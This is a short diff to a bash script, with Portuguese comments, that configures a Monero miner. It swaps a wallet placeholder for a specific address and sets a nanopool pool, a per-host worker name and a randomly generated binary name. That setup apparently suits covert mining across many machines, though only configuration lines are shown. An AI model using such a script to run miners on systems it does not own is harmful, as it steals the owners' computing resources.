@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # === CONFIGURAÇÃO ===
-WALLET="SEU_ENDERECO_MONERO_AQUI"  # coloque aqui sua wallet Monero
+WALLET="46sF91sVBzUVMgoV2nd5DQTSKM1LgvArTQNw5kufrVNYVV4CDrMiKno4c5kTpoqnH9eVu3dGqTuyEWH5muz32f9XESZHUrm"
 POOL="xmr-eu1.nanopool.org:14433"
 WORKER=$(hostname)-$(date +%s)
 RAND_BIN=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
